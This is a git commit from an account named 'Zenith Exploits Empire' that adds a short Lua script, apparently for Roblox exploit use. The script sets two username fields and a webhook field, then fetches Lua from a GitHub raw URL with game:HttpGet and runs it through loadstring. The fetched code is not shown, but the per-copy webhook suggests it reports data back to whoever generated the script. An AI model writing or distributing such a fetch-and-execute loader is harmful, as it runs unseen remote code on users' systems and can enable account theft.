a86d5d1b798ba3fdd9a5916a5982808e101c7312
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-18 17:03:11 +0200

    Add generated script

---
+++ scripts/Skibidi.lua
@@ -0,0 +1,7 @@
+
+Username = "hi"
+Username2 = "hi"
+Webhook = "dssvx.com"
+
+-- The rest of the code stays constant, and only the three fields above are updated dynamically
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Gen-v2/main/scripts/Skibidi.lua"))()
